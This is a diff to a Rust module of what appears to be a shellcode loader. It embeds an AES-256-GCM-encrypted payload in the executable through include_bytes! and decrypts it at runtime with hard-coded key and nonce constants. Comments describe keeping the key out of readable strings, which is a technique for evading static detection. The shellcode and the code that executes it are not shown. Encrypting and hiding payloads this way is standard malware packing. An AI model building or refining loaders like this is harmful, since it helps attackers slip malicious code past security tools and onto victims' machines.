@@ -1,29 +1,31 @@
 //! crypto.rs — AES-256-GCM runtime decryption
 //!
-//! The encrypted shellcode blob and the key/nonce constants live in
-//! shellcode.rs.  This module provides the single `decrypt` function that
-//! the loader calls at runtime to recover the plaintext shellcode bytes.
+//! The encrypted payload is embedded directly into the binary at link time
+//! via include_bytes!. No file needs to be deployed alongside the .exe.
 //!
-//! The key is stored as a raw [u8; 32] constant — never a string literal —
-//! so it does not appear in the binary's .rodata section as printable ASCII.
+//! The KEY and NONCE live in shellcode.rs and are baked in at compile time.
 
 use aes_gcm::{
     aead::{Aead, KeyInit},
     Aes256Gcm, Key, Nonce,
 };
 
-use crate::shellcode::{ENCRYPTED_SHELLCODE, KEY, NONCE};
+use crate::shellcode::{KEY, NONCE};
 
-/// Decrypt the embedded shellcode blob.
-///
-/// Returns `Ok(Vec<u8>)` containing the raw shellcode on success, or
-/// `Err(&'static str)` if the GCM authentication tag does not verify
-/// (tampered binary, wrong key, etc.).
+/// Embedded encrypted payload — included at link time, not parsed by rustc.
+/// This avoids the compiler OOM that occurs with large const byte arrays.
+static PAYLOAD: &[u8] = include_bytes!("payload.bin");
+
+/// Decrypt the embedded payload and return raw shellcode bytes.
 pub fn decrypt() -> Result<Vec<u8>, &'static str> {
+    if PAYLOAD.is_empty() {
+        return Err("embedded payload is empty — run prepare.sh to build");
+    }
+
     let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&KEY));
     let nonce  = Nonce::from_slice(&NONCE);
 
     cipher
-        .decrypt(nonce, ENCRYPTED_SHELLCODE.as_ref())
-        .map_err(|_| "AES-GCM decryption failed: bad tag or tampered ciphertext")
+        .decrypt(nonce, PAYLOAD)
+        .map_err(|_| "AES-GCM decryption failed: bad tag or tampered payload")
 }
